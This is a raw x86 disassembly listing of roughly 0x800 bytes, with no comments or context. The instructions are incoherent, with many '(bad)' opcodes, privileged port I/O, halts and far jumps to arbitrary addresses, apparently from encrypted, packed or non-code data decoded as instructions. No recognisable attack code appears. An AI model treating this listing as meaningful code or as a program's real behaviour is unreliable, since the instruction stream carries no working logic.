  40406f:	sbb    bh,BYTE PTR [eax-0x1417b553]
  404075:	adc    BYTE PTR [edx],0x96
  404078:	cmc    
  404079:	pop    ecx
  40407a:	adc    esi,edx
  40407c:	repz adc dh,BYTE PTR [ecx+0xc6a67ee]
  404083:	ins    DWORD PTR es:[edi],dx
  404084:	inc    ebx
  404085:	push   eax
  404086:	mov    bh,0x6a
  404088:	and    DWORD PTR [ebx+0x2c],0x1e
  40408c:	sbb    al,BYTE PTR [ebp+0x1b]
  40408f:	sbb    ah,ch
  404091:	sti    
  404092:	out    0x73,al
  404094:	xchg   ecx,eax
  404095:	sub    BYTE PTR [ecx+0x60938b56],dh
  40409b:	call   0x71a0ffcc
  4040a0:	ins    DWORD PTR es:[edi],dx
  4040a1:	stc    
  4040a2:	sbb    al,0xa6
  4040a4:	test   eax,0x450f5f48
  4040a9:	dec    ebx
  4040aa:	outs   dx,BYTE PTR ds:[esi]
  4040ab:	and    ch,BYTE PTR [eax-0x68]
  4040ae:	inc    edx
  4040af:	adc    ebx,DWORD PTR ds:0x912ac70f
  4040b5:	ret    0x957a
  4040b8:	jl     0x404048
  4040ba:	and    BYTE PTR [edi-0x4df73e41],ah
  4040c0:	xchg   ecx,eax
  4040c2:	mov    al,ds:0x178f5003
  4040c7:	sub    DWORD PTR [edi],ebx
  4040c9:	in     eax,dx
  4040ca:	stc    
  4040cb:	xchg   esp,eax
  4040cc:	pavgw  mm4,QWORD PTR [ecx-0x6ee6c2c9]
  4040d3:	mov    ds:0x828129b7,al
  4040d8:	nop
  4040d9:	pop    edi
  4040da:	aaa    
  4040db:	or     BYTE PTR [edx-0x3],ch
  4040de:	jne    0x4040ee
  4040e0:	dec    esi
  4040e1:	ins    DWORD PTR es:[edi],dx
  4040e2:	fild   QWORD PTR [eax-0x47c62d65]
  4040e8:	mov    edi,DWORD PTR [edx+ebx*4+0x20f77963]
  4040ef:	in     al,dx
  4040f0:	and    edi,DWORD PTR [eax+0x7d]
  4040f3:	sbb    BYTE PTR [ebp-0x4f],0x77
  4040f7:	or     BYTE PTR [ebp+0x4],bl
  4040fa:	jp     0x4040a6
  4040fc:	push   0x4a
  4040fe:	(bad)  
  4040ff:	ins    DWORD PTR es:[edi],dx
  404100:	aad    0x7
  404102:	mov    ds:0x6f4bbf01,eax
  404107:	stos   DWORD PTR es:[edi],eax
  404108:	(bad)  
  40410a:	stos   BYTE PTR es:[edi],al
  40410b:	cwde   
  40410c:	pop    ss
  40410d:	hlt    
  40410e:	dec    esi
  40410f:	ret    
  404110:	loope  0x40412a
  404112:	rcr    DWORD PTR es:[esi-0x5d2b8c],1
  404119:	mov    ch,0xa
  40411b:	loop   0x404102
  40411d:	bound  ebx,QWORD PTR [esi+0x29]
  404120:	lods   al,BYTE PTR ds:[esi]
  404121:	retf   
  404122:	xchg   DWORD PTR [ebp-0x65],edx
  404125:	mov    edx,0x160027d5
  40412a:	mov    esp,0x42648b78
  40412f:	jp     0x404189
  404131:	popa   
  404132:	push   edi
  404133:	(bad)  
  404134:	xor    DWORD PTR [edi-0x18573097],edi
  40413a:	push   0xad4fb18
  40413f:	mov    edx,0xcb7d3b17
  404144:	xchg   esp,eax
  404145:	ins    BYTE PTR es:[edi],dx
  404146:	sub    al,0x97
  404148:	add    ebp,DWORD PTR [ebp+eax*4+0x7553e84b]
  40414f:	cmp    BYTE PTR [eax],ch
  404151:	repnz sar DWORD PTR [ebp+0x556b5c9d],cl
  404158:	fimul  DWORD PTR [ebx+esi*8+0x76ac7a72]
  40415f:	xchg   ebx,eax
  404160:	sub    al,0x1c
  404162:	ins    DWORD PTR es:[edi],dx
  404163:	rol    BYTE PTR [edi-0x23],0x2a
  404167:	mov    ebx,0xa4a3171a
  40416c:	sbb    dh,BYTE PTR [ebx-0x20]
  40416f:	and    eax,0x5efd4a5a
  404174:	push   esp
  404175:	and    DWORD PTR [ecx+esi*8+0x601e0afb],ecx
  40417c:	inc    ebp
  40417d:	leave  
  40417e:	xor    al,0x5
  404180:	pushf  
  404181:	xor    al,0xcc
  404183:	fnstsw WORD PTR [edx]
  404185:	jge    0x404141
  404187:	jmp    0xdd78:0x9c99e832
  40418e:	inc    eax
  40418f:	and    dl,al
  404191:	sbb    esi,DWORD PTR [eax+0x490c917c]
  404197:	and    DWORD PTR [esi+0x2d8c3ddb],eax
  40419d:	ins    BYTE PTR es:[edi],dx
  40419e:	or     eax,0xcdc2b955
  4041a3:	adc    cl,BYTE PTR [eax]
  4041a5:	fist   DWORD PTR [ecx]
  4041a7:	dec    BYTE PTR [edi-0x59b942dd]
  4041ad:	adc    ebx,DWORD PTR [edx]
  4041af:	fwait
  4041b0:	mov    al,0xcc
  4041b2:	pop    edx
  4041b3:	mov    ds:0x5ca6baee,al
  4041b8:	push   edx
  4041b9:	mov    ebp,0xe3be5b4a
  4041be:	scas   al,BYTE PTR es:[edi]
  4041bf:	(bad)  
  4041c0:	outs   dx,DWORD PTR ds:[esi]
  4041c1:	jnp    0x404236
  4041c3:	popa   
  4041c4:	loop   0x404176
  4041c6:	sbb    al,BYTE PTR [ebp+0x5a0850c6]
  4041cc:	sbb    BYTE PTR ds:0xd3abcff6,dh
  4041d2:	push   esi
  4041d3:	adc    BYTE PTR [ecx],0xa8
  4041d6:	into   
  4041d7:	xchg   DWORD PTR ds:0x6e2ab753,ecx
  4041dd:	push   es
  4041de:	(bad)  
  4041df:	jb     0x404241
  4041e1:	jb     0x404188
  4041e3:	xor    eax,0x23688b98
  4041e8:	xor    al,0xe1
  4041ea:	scas   eax,DWORD PTR es:[edi]
  4041eb:	js     0x4041fa
  4041ed:	sbb    DWORD PTR [edi+0x2937e5cd],esi
  4041f3:	push   ebx
  4041f4:	xor    eax,0xffea68f4
  4041f9:	jmp    0x254a:0x67eded75
  404200:	adc    DWORD PTR [esp+ebp*8],esp
  404203:	sub    BYTE PTR [edx],0xa1
  404206:	xchg   BYTE PTR [ebp+0x15c52bea],ch
  40420c:	std    
  40420d:	arpl   WORD PTR [eax+esi*8-0x10458e1f],bx
  404214:	mov    ch,0xfe
  404216:	pushf  
  404217:	push   ebx
  404218:	ja     0x40427d
  40421a:	sbb    ebx,DWORD PTR [eax+ebp*2]
  40421d:	(bad)  
  40421e:	and    eax,0x1fd57a97
  404223:	pop    ebp
  404224:	sub    DWORD PTR [esi],ebx
  404226:	sbb    al,0x8e
  404228:	lar    eax,WORD PTR [ebp+eiz*2-0xe]
  40422d:	stc    
  40422e:	dec    esp
  40422f:	addr16 pop es
  404231:	adc    BYTE PTR [esi-0x20],bh
  404234:	sub    edi,DWORD PTR [ebp+0x11565529]
  40423a:	inc    edx
  40423b:	and    BYTE PTR [ebx-0x58],cl
  40423e:	mov    ebp,0x38f9d2c2
  404243:	jb     0x4041f6
  404245:	jle    0x404294
  404247:	adc    al,BYTE PTR [edi+0x6d]
  40424a:	jmp    0xdbae4cd5
  40424f:	mov    ds:0x301a1404,eax
  404254:	xor    esp,DWORD PTR [esp+eiz*2]
  404257:	mov    al,0xf
  404259:	pop    edx
  40425a:	sbb    eax,0x751bfc97
  40425f:	outs   dx,BYTE PTR ds:[esi]
  404260:	cld    
  404261:	pop    edi
  404262:	mov    WORD PTR [ebp-0x1],?
  404265:	pop    edi
  404266:	mov    esp,DWORD PTR [ebx+0x1c1c9bc0]
  40426c:	scas   al,BYTE PTR es:[edi]
  40426d:	scas   al,BYTE PTR es:[edi]
  40426e:	or     ebx,DWORD PTR [ecx]
  404270:	sbb    eax,0xb13b0dfb
  404275:	sahf   
  404276:	lock outs dx,BYTE PTR ds:[esi]
  404278:	dec    esp
  404279:	pop    ecx
  40427a:	jbe    0x40425e
  40427c:	cli    
  40427d:	shl    DWORD PTR [esi+0x34b5174c],cl
  404283:	fcom   QWORD PTR [eax+0x3126c207]
  404289:	jae    0x4042cb
  40428b:	retf   
  40428c:	leave  
  40428d:	dec    ebx
  40428e:	sub    eax,edi
  404290:	aam    0xa2
  404292:	jbe    0x4042f2
  404294:	pushf  
  404295:	cdq    
  404296:	test   eax,0x8341f1a2
  40429b:	cmc    
  40429c:	ret    
  40429d:	mov    eax,ebp
  40429f:	mov    esp,0x3d7ee73e
  4042a4:	stc    
  4042a5:	pusha  
  4042a6:	das    
  4042a7:	xor    DWORD PTR [esi-0x6f],ecx
  4042aa:	lods   eax,DWORD PTR ds:[esi]
  4042ab:	jbe    0x40428e
  4042ad:	and    esp,eax
  4042af:	and    al,0xe5
  4042b1:	hlt    
  4042b2:	mov    al,ds:0x9ec10df3
  4042b7:	ins    DWORD PTR es:[edi],dx
  4042b8:	jb     0xd51c478c
  4042be:	and    DWORD PTR [edx-0x39],0xffffffdb
  4042c2:	adc    DWORD PTR [edi-0x57],esi
  4042c5:	jnp    0x4042ff
  4042c7:	in     eax,0x89
  4042c9:	aas    
  4042ca:	push   eax
  4042cb:	fst    QWORD PTR [esi+0x29847701]
  4042d1:	and    DWORD PTR [ebp-0x32],ebp
  4042d4:	test   al,0xf0
  4042d6:	push   cs
  4042d7:	mov    ds:0x7f701566,eax
  4042dc:	sti    
  4042dd:	sub    eax,0x59b367ab
  4042e2:	sub    edi,esi
  4042e4:	call   0x75be:0xd361f6e4
  4042eb:	sbb    DWORD PTR [ebx],esp
  4042ed:	call   DWORD PTR ds:0x71d987b0
  4042f3:	jb     0x404365
  4042f5:	xchg   ebx,eax
  4042f6:	cwde   
  4042f7:	scas   al,BYTE PTR es:[edi]
  4042f8:	add    BYTE PTR [edi+0xde3cccf],dh
  4042fe:	sub    al,0xf9
  404300:	ret    0xcaf3
  404303:	test   ecx,edi
  404305:	jge    0x40435e
  404307:	les    ecx,FWORD PTR [eax-0x59]
  40430a:	adc    DWORD PTR [eax],edx
  40430c:	mov    al,ds:0x95fcad88
  404311:	adc    DWORD PTR [edi],edx
  404313:	sbb    DWORD PTR [edx],0xe52000a6
  404319:	cmp    eax,esp
  40431b:	mov    bh,0xe4
  40431d:	(bad)  
  40431f:	xchg   ecx,eax
  404320:	stos   BYTE PTR es:[edi],al
  404321:	loopne 0x4042a4
  404323:	jno    0x4042fd
  404325:	leave  
  404326:	inc    ebx
  404327:	and    esi,DWORD PTR [ebp+0x14]
  40432a:	push   ecx
  40432b:	jecxz  0x404326
  40432d:	dec    edi
  40432e:	dec    ecx
  40432f:	(bad)  
  404330:	sar    BYTE PTR ds:0x13e583eb,0xfe
  404337:	xchg   DWORD PTR [esi],ebp
  404339:	jl     0x404308
  40433b:	cmp    edx,DWORD PTR [ebx]
  40433d:	mov    bl,0x6b
  40433f:	cmc    
  404340:	std    
  404341:	mov    esp,0xfe3a8a14
  404346:	mov    ch,0x1a
  404348:	and    BYTE PTR [edx],dh
  40434a:	adc    eax,0x5725895a
  40434f:	sbb    DWORD PTR [edx],eax
  404351:	push   ds
  404352:	outs   dx,DWORD PTR ds:[esi]
  404353:	mov    esi,0xc5069e83
  404358:	mov    bh,0x82
  40435a:	lock add dl,BYTE PTR [eax+0x179e8a6d]
  404361:	pop    es
  404362:	mov    cl,0x63
  404364:	out    dx,eax
  404365:	iret   
  404366:	outs   dx,BYTE PTR ds:[esi]
  404367:	sub    ebp,edx
  404369:	or     eax,0x9e49a945
  40436e:	pop    es
  40436f:	and    dl,BYTE PTR [ebp+0x35]
  404372:	das    
  404373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404374:	fisubr WORD PTR [esi+0xb0d4714]
  40437c:	lds    eax,FWORD PTR [ebx]
  40437e:	jmp    0x19ed7ce8
  404383:	sahf   
  404384:	ret    
  404385:	jmp    0x7520992e
  40438a:	fistp  DWORD PTR [ecx-0x52]
  40438d:	jb     0x404327
  40438f:	das    
  404390:	(bad)  
  404391:	in     al,0x2d
  404393:	push   cs
  404394:	stos   BYTE PTR es:[edi],al
  404395:	neg    BYTE PTR [ebx]
  404397:	out    0xeb,eax
  404399:	ret    
  40439a:	arpl   WORD PTR [eax-0x12b48205],sp
  4043a0:	push   esp
  4043a1:	push   edx
  4043a2:	jmp    0x40440f
  4043a4:	dec    ebp
  4043a5:	xchg   edx,eax
  4043a6:	mov    dh,0xd1
  4043a8:	in     al,dx
  4043a9:	inc    edi
  4043aa:	adc    edi,DWORD PTR [eax-0x72]
  4043ad:	pop    edi
  4043ae:	xchg   edi,eax
  4043af:	pop    ebp
  4043b0:	pop    esp
  4043b1:	dec    ecx
  4043b2:	xor    eax,0x6651f88
  4043b7:	xchg   ebp,eax
  4043b8:	mov    ds:0x1d776975,al
  4043bd:	les    edx,FWORD PTR [edx+0xa]
  4043c0:	outs   dx,DWORD PTR ds:[esi]
  4043c1:	loopne 0x4043de
  4043c3:	div    DWORD PTR [edi+0x392c7328]
  4043c9:	xor    eax,DWORD PTR [eax+0x48f59706]
  4043cf:	sub    bh,BYTE PTR [edi-0x36]
  4043d2:	lods   eax,DWORD PTR ds:[esi]
  4043d3:	lds    esi,FWORD PTR [ebp-0x58]
  4043d6:	(bad)  
  4043d7:	out    dx,eax
  4043d8:	pop    esi
  4043d9:	das    
  4043da:	pop    edi
  4043db:	push   ebp
  4043dc:	pop    es
  4043dd:	and    eax,0xe7bc2c0
  4043e2:	(bad)  
  4043e3:	inc    edi
  4043e4:	les    ecx,FWORD PTR [ecx+eiz*2]
  4043e7:	cdq    
  4043e8:	and    al,0x49
  4043ea:	daa    
  4043eb:	add    dh,ch
  4043ed:	or     BYTE PTR [ebp+0x4cc362e1],bl
  4043f3:	jmp    0xcde8cdac
  4043f8:	adc    BYTE PTR [ebx-0x3],bl
  4043fb:	retf   
  4043fc:	mov    DWORD PTR [edi+0x2a],edi
  4043ff:	cwde   
  404400:	inc    edx
  404401:	inc    esp
  404402:	ror    DWORD PTR [edx-0x68],cl
  404405:	jl     0x404465
  404407:	mov    bl,BYTE PTR [ebp+0x4e]
  40440a:	or     esp,DWORD PTR [edx+0x5ae981aa]
  404410:	pop    ebp
  404411:	imul   ecx,DWORD PTR [eax-0x30],0x658474f8
  404418:	mov    ds:0xf3ded0e8,al
  40441d:	(bad)  
  40441e:	xor    DWORD PTR [esp+eax*2-0x45d7d68c],eax
  404425:	in     al,0x56
  404427:	js     0x404479
  404429:	(bad)  
  40442a:	fst    QWORD PTR [ebx]
  40442c:	add    eax,DWORD PTR [edi-0x4533b02a]
  404432:	sub    bl,BYTE PTR [edi-0x66]
  404435:	pop    ds
  404436:	sbb    edi,DWORD PTR [edx]
  404438:	mov    DWORD PTR [edx+0x2],ebp
  40443b:	lods   al,BYTE PTR ds:[esi]
  40443c:	popf   
  40443d:	in     al,dx
  40443e:	push   ebx
  40443f:	shl    DWORD PTR [ebx],cl
  404441:	cwde   
  404442:	inc    edi
  404443:	push   es
  404444:	xchg   ecx,eax
  404445:	inc    esi
  404446:	mov    edx,0xef9e02d4
  40444b:	dec    ebx
  40444c:	inc    esp
  40444d:	fwait
  40444e:	rep lods al,BYTE PTR ds:[esi]
  404450:	pop    eax
  404451:	xchg   esi,eax
  404452:	hlt    
  404453:	(bad)  [esi-0x11]
  404456:	sbb    eax,0xe88d0f6b
  40445b:	cmc    
  40445c:	push   ds
  40445d:	ins    DWORD PTR es:[edi],dx
  40445e:	cdq    
  40445f:	mov    eax,ds:0x1397a2ee
  404464:	inc    ebp
  404465:	adc    ebp,ecx
  404467:	cmp    DWORD PTR [esp+esi*8+0x157c530d],ebx
  40446e:	xor    BYTE PTR [edx+0x4a90d678],dl
  404474:	xchg   edi,eax
  404475:	es mov ebx,0x2998de65
  40447b:	mov    ds:0x54207ae9,al
  404480:	jle    0x404457
  404482:	pop    esp
  404483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404484:	push   es
  404485:	mov    al,ds:0xc58a8ae8
  40448a:	fwait
  40448b:	jmp    0x83b:0x4532ff56
  404492:	rcl    BYTE PTR [esi-0x77f1ac5e],cl
  404498:	hlt    
  404499:	or     ebx,DWORD PTR [ecx-0x73]
  40449c:	inc    edi
  40449d:	inc    ebx
  40449e:	push   eax
  40449f:	push   ecx
  4044a0:	jo     0x40443c
  4044a2:	clc    
  4044a3:	sbb    DWORD PTR [eax],0x9e0221bd
  4044a9:	sub    DWORD PTR [edx+0x32f0231e],0xffffffb2
  4044b0:	hlt    
  4044b1:	add    dh,BYTE PTR [esi-0x2e]
  4044b4:	daa    
  4044b5:	and    ah,dl
  4044b7:	aaa    
  4044b8:	inc    edx
  4044b9:	pusha  
  4044ba:	xor    DWORD PTR ds:0x1f5cd3cf,esp
  4044c0:	inc    eax
  4044c1:	pop    esp
  4044c2:	repnz dec ebx
  4044c4:	push   0x1b638faf
  4044c9:	push   esp
  4044ca:	push   es
  4044cb:	mov    esp,0xa4955e39
  4044d0:	in     al,dx
  4044d1:	addr16 test al,0xe7
  4044d4:	inc    edi
  4044d5:	jb     0x40447d
  4044d7:	(bad)  
  4044d8:	fs sti 
  4044da:	(bad)  
  4044db:	pusha  
  4044dc:	mov    bl,BYTE PTR [esi+0x3b]
  4044df:	add    ah,BYTE PTR [esi+0x86fd75b]
  4044e5:	outs   dx,BYTE PTR ds:[esi]
  4044e6:	iret   
  4044e7:	cmp    edx,DWORD PTR [esi-0x590a4f32]
  4044ed:	leave  
  4044ee:	push   es
  4044ef:	lock (bad) 
  4044f2:	icebp  
  4044f3:	in     al,dx
  4044f4:	mov    ebx,0xd489c9df
  4044f9:	xchg   ebp,eax
  4044fa:	sbb    ebx,DWORD PTR [esi]
  4044fc:	rol    edx,0x4e
  4044ff:	ss xchg ebp,eax
  404501:	div    DWORD PTR [edx]
  404503:	adc    DWORD PTR ds:0xa4fdc412,esi
  404509:	and    BYTE PTR [eax],dl
  40450b:	aad    0xcc
  40450d:	cdq    
  40450e:	cs dec ecx
  404510:	sbb    DWORD PTR [ecx-0x41],esi
  404513:	jbe    0x4044b8
  404515:	dec    ebx
  404516:	ror    bh,0x47
  404519:	fisttp WORD PTR [ecx]
  40451b:	lods   al,BYTE PTR ds:[esi]
  40451c:	or     eax,0x28ef02be
  404521:	mov    esp,0xaaf9dee0
  404526:	dec    edx
  404527:	jmp    0x4044dc
  404529:	test   BYTE PTR [ecx-0x57fe414c],dh
  40452f:	pop    eax
  404530:	mov    bh,0xf4
  404532:	lods   eax,DWORD PTR ds:[esi]
  404533:	jne    0x404513
  404535:	addr16 xchg ebx,eax
  404537:	dec    ebx
  404538:	test   eax,0xf20d1468
  40453d:	hlt    
  40453e:	scas   al,BYTE PTR es:[edi]
  40453f:	xlat   BYTE PTR ds:[ebx]
  404540:	lods   al,BYTE PTR ds:[esi]
  404541:	test   al,0x18
  404543:	push   eax
  404544:	stos   DWORD PTR es:[edi],eax
  404545:	mov    dh,0xb0
  404547:	retf   
  404548:	jmp    0x563f:0xba687119
  40454f:	popa   
  404550:	idiv   DWORD PTR [ebp+0x43]
  404553:	fistp  WORD PTR [edi+0x6f51e204]
  404559:	pop    esp
  40455a:	mov    ebp,0x9517a3db
  40455f:	xor    ch,BYTE PTR [esi-0x3171fcf4]
  404565:	das    
  404566:	cwde   
  404567:	or     al,0x11
  404569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40456a:	pop    eax
  40456b:	add    edi,DWORD PTR [ebp+0xa]
  40456e:	rcl    BYTE PTR [esi],1
  404570:	push   0xf6221742
  404575:	and    bl,0xcb
  404578:	inc    esp
  404579:	out    0xb5,al
  40457b:	mov    edx,0xb2eada14
  404580:	sub    BYTE PTR [edx-0x8cc076a],0xf9
  404587:	or     edi,DWORD PTR [eax+0x3948c088]
  40458d:	add    ebx,ecx
  40458f:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  404591:	sub    DWORD PTR [ebp-0x6c],ebp
  404594:	mov    dh,BYTE PTR ds:0xfa0b3af1
  40459a:	push   eax
  40459b:	adc    DWORD PTR [esi],0xde2d3974
  4045a1:	fwait
  4045a2:	cmp    eax,ebx
  4045a4:	ja     0x4045c6
  4045a6:	lock in al,0xd2
  4045a9:	and    eax,0x1df9fe79
  4045ae:	push   0x1499e90e
  4045b3:	dec    edx
  4045b4:	outs   dx,BYTE PTR ds:[esi]
  4045b5:	ror    BYTE PTR [eax],cl
  4045b7:	and    bl,BYTE PTR [eax]
  4045b9:	inc    esi
  4045ba:	cld    
  4045bb:	add    BYTE PTR [ebp-0x1179e2c],cl
  4045c1:	das    
  4045c2:	rcr    BYTE PTR [ecx+0x6a48932],cl
  4045c8:	retf   
  4045c9:	bound  ecx,QWORD PTR [edi]
  4045cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045cc:	xlat   BYTE PTR ds:[ebx]
  4045cd:	jnp    0x40459b
  4045cf:	mov    cl,0x39
  4045d1:	jg     0x404575
  4045d3:	repnz add DWORD PTR [edx],0x3f
  4045d7:	ja     0x404575
  4045d9:	or     DWORD PTR [esi-0x240a022d],0xffffff8a
  4045e0:	jne    0x40457c
  4045e2:	adc    eax,0x874f4bb0
  4045e7:	lods   eax,DWORD PTR ds:[esi]
  4045e8:	clc    
  4045e9:	daa    
  4045ea:	push   edi
  4045eb:	jo     0x4045f9
  4045ed:	bnd jno 0x4045e1
  4045f0:	imul   edx,edi,0xffffffd7
  4045f3:	add    BYTE PTR [ebx-0x22],dh
  4045f6:	or     BYTE PTR [ecx+0x7fdbd096],cl
  4045fc:	xchg   DWORD PTR [edx+0x7],esp
  4045ff:	push   ebx
  404600:	in     al,0x28
  404602:	xlat   BYTE PTR ds:[bx]
  404604:	dec    edx
  404605:	loope  0x4045fe
  404607:	aas    
  404608:	and    ebx,ecx
  40460a:	jecxz  0x40462b
  40460c:	aam    0xf
  40460e:	sub    BYTE PTR [ebp-0x49],0xdb
  404612:	jge    0x4045a5
  404614:	lock xchg esp,eax
  404616:	sar    BYTE PTR [edi-0x20],0xf0
  40461a:	and    DWORD PTR [ebx+0x3f],edx
  40461d:	mov    cl,0x4d
  40461f:	pop    es
  404620:	sar    cl,cl
  404622:	imul   eax,DWORD PTR [edi+0x48],0x7a3548c2
  404629:	sub    al,0xa3
  40462b:	call   0x9e38:0xbd27d9d2
  404632:	retf   
  404633:	into   
  404634:	push   es
  404635:	or     bh,BYTE PTR [edx]
  404637:	fnstenv [eax]
  404639:	push   esi
  40463a:	test   edi,edx
  40463c:	jecxz  0x4046ad
  40463e:	not    BYTE PTR [eax]
  404640:	icebp  
  404641:	test   al,0xed
  404643:	xlat   BYTE PTR ds:[ebx]
  404644:	aaa    
  404645:	xchg   esi,eax
  404646:	pop    ss
  404647:	sub    ch,bl
  404649:	xor    eax,eax
  40464b:	fsubrp st(1),st
  40464d:	pop    ebp
  40464e:	or     al,0x98
  404650:	mov    eax,ds:0x3dc761a5
  404655:	aaa    
  404656:	push   eax
  404657:	es (bad) 
  404659:	out    dx,eax
  40465a:	pop    ebx
  40465b:	pop    ss
  40465c:	les    ebx,FWORD PTR [ebx]
  40465e:	int3   
  40465f:	inc    esi
  404660:	and    bh,BYTE PTR [ebp+0x7f]
  404663:	arpl   WORD PTR [ecx],bx
  404665:	dec    edi
  404666:	add    BYTE PTR [ecx],ah
  404668:	and    bl,BYTE PTR [ebx+0x44eb9196]
  40466e:	jecxz  0x40466b
  404670:	mov    edi,ecx
  404672:	int3   
  404673:	push   ebx
  404674:	mov    eax,cs:0x5c87d8a8
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	add    al,0x20
  40467d:	test   eax,0x84ac55e4
  404682:	fcom   DWORD PTR [ebx+ecx*1]
  404685:	sub    edi,eax
  404687:	inc    ebp
  404688:	lahf   
  404689:	ret    
  40468a:	jecxz  0x404660
  40468c:	shl    DWORD PTR [edx],0xd4
  40468f:	sbb    eax,0xfcf675af
  404694:	jg     0x4046a3
  404696:	jg     0x4046d3
  404698:	retf   
  404699:	or     cl,cl
  40469b:	(bad)  
  40469c:	adc    eax,0x3a5f5e2f
  4046a1:	pop    ebx
  4046a2:	daa    
  4046a3:	and    ch,BYTE PTR [edx+0x368c18d3]
  4046a9:	mov    al,0x26
  4046ab:	push   ss
  4046ac:	adc    BYTE PTR [ebp-0x215e577],ch
  4046b2:	(bad)  
  4046b3:	jb     0x404699
  4046b5:	add    al,0x32
  4046b7:	adc    esp,DWORD PTR [edx+0x2357eeef]
  4046bd:	mov    ecx,0x6abdce1b
  4046c2:	test   al,0x9f
  4046c4:	test   ch,cl
  4046c6:	loopne 0x4046be
  4046c8:	xchg   DWORD PTR [edx+0x26],edx
  4046cb:	ja     0x4046d6
  4046cd:	mov    bl,0xd7
  4046cf:	jge    0x4046ca
  4046d1:	cmp    bl,cl
  4046d3:	mul    BYTE PTR [eax+ebx*4]
  4046d6:	icebp  
  4046d7:	push   ebx
  4046d8:	cdq    
  4046d9:	fstp   QWORD PTR [edi]
  4046db:	int    0x89
  4046dd:	mov    ch,BYTE PTR [ebp+0x8]
  4046e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046e1:	mov    ch,0x1e
  4046e3:	mov    esi,0xd0c2723f
  4046e8:	push   edx
  4046e9:	mov    eax,0xa1a8061e
  4046ee:	dec    edi
  4046ef:	lea    esi,[edi+0x5e]
  4046f2:	and    BYTE PTR [ebx-0x440bce05],bl
  4046f8:	rcl    dl,1
  4046fa:	jnp    0x404730
  4046fc:	mov    ch,0xad
  4046fe:	and    cl,BYTE PTR [edi-0x1d]
  404701:	jmp    0x6ee08830
  404706:	sub    DWORD PTR [eax+0x132da631],0xffffffb5
  40470d:	ja     0x4046ed
  40470f:	add    eax,0x2dd24b3f
  404714:	mov    dl,0x37
  404716:	push   ebp
  404717:	clc    
  404718:	(bad)  
  404719:	bswap  edi
  40471b:	dec    edi
  40471c:	pop    es
  40471d:	repnz jecxz 0x40471b
  404720:	jbe    0x404781
  404722:	imul   eax,esi,0xa83f1c0f
  404728:	lods   al,BYTE PTR ds:[esi]
  404729:	hlt    
  40472a:	sahf   
  40472b:	loopne 0x404714
  40472d:	not    BYTE PTR [edi]
  40472f:	out    0xda,al
  404731:	inc    edx
  404732:	lahf   
  404733:	dec    DWORD PTR [ecx-0x48]
  404736:	cli    
  404737:	sbb    esi,esi
  404739:	and    eax,0x46c7cab7
  40473e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40473f:	or     ebx,eax
  404741:	lods   eax,DWORD PTR ds:[esi]
  404742:	sub    al,0x7f
  404744:	pop    eax
  404745:	hlt    
  404746:	add    bl,BYTE PTR [ebp-0x4c81bfb8]
  40474c:	dec    esp
  40474d:	(bad)  
  40474e:	cli    
  40474f:	add    ebp,DWORD PTR [edx+0x63ac6a19]
  404755:	push   esi
  404756:	clc    
  404757:	sbb    esp,ecx
  404759:	out    0x97,eax
  40475b:	and    al,0x77
  40475d:	inc    esi
  40475e:	adc    BYTE PTR [edx-0x2b596510],ch
  404764:	into   
  404765:	or     BYTE PTR ds:0xe97b8c5b,0x61
  40476c:	and    dh,BYTE PTR [edx+0x26]
  40476f:	sti    
  404770:	jg     0x4047b3
  404772:	add    eax,0x7908be82
  404777:	sub    ch,ch
  404779:	inc    ebp
  40477a:	mov    WORD PTR [esi+0x50],es
  40477d:	out    0xad,al
  40477f:	pop    edx
  404780:	mov    cl,0xfc
  404782:	pop    ds
  404783:	(bad)  
  404784:	aaa    
  404785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404786:	xchg   ebx,eax
  404787:	aad    0x45
  404789:	ins    BYTE PTR es:[edi],dx
  40478a:	(bad)  [esi-0x78ae7d9f]
  404790:	push   esi
  404791:	xchg   esp,eax
  404792:	ss repnz xor eax,0x9613d8ec
  404799:	imul   edx,DWORD PTR ds:0xc57a6c86,0xffffffb6
  4047a0:	stos   DWORD PTR es:[edi],eax
  4047a1:	in     al,0x56
  4047a3:	mov    ah,0xf0
  4047a5:	and    DWORD PTR [ebx-0x123bd02a],0x3f0f7fae
  4047af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047b0:	(bad)  [edi-0x1dce3a7b]
  4047b6:	outs   dx,DWORD PTR gs:[esi]
  4047b8:	popf   
  4047b9:	cdq    
  4047ba:	sbb    DWORD PTR [ecx+0x31],edi
  4047bd:	sbb    esp,DWORD PTR ds:[ebx]
  4047c0:	pop    ebx
  4047c1:	adc    al,0x66
  4047c3:	dec    ecx
  4047c4:	mov    eax,ds:0x448ba34c
  4047c9:	push   cs
  4047ca:	aas    
  4047cb:	mov    eax,ds:0xacf66fe0
  4047d0:	ficom  DWORD PTR [esi+0x7d]
  4047d3:	xor    cl,ah
  4047d5:	xchg   edi,eax
  4047d6:	mov    edx,0x96924ad
  4047db:	test   bh,dh
  4047dd:	pop    ebp
  4047de:	inc    ebx
  4047df:	or     al,0xd3
  4047e1:	push   edx
  4047e2:	ss jecxz 0x40479f
  4047e5:	gs cmp eax,0x6a5c305d
  4047eb:	adc    BYTE PTR [edi+edi*4-0x7df3231f],bl
  4047f2:	ins    BYTE PTR es:[edi],dx
  4047f3:	shr    BYTE PTR [ebp-0x2a4270c9],0xf3
  4047fa:	push   esp
  4047fb:	mov    edx,0x352dad68
  404800:	repnz pop edi
  404802:	inc    esi
  404803:	in     eax,dx
  404804:	add    esi,edx
  404806:	aaa    
  404807:	shr    BYTE PTR gs:[bp+di],cl
  40480b:	push   es
  40480c:	jp     0x4047b5
  40480e:	(bad)  [esi]
  404810:	mov    eax,ds:0x2268fce9
  404815:	test   esi,esp
  404817:	push   0xffffffab
  404819:	int3   
  40481a:	jae    0x40484c
  40481c:	sub    eax,esp
  40481e:	jmp    0x388c:0x679c56ca
  404825:	adc    BYTE PTR [eax+0x49],al
  404828:	fadd   QWORD PTR [edx+ebx*4-0x26]
  40482c:	push   ebp
  40482d:	push   DWORD PTR [ecx+0x26]
  404830:	loopne 0x404881
  404832:	retf   
  404833:	js     0x404800
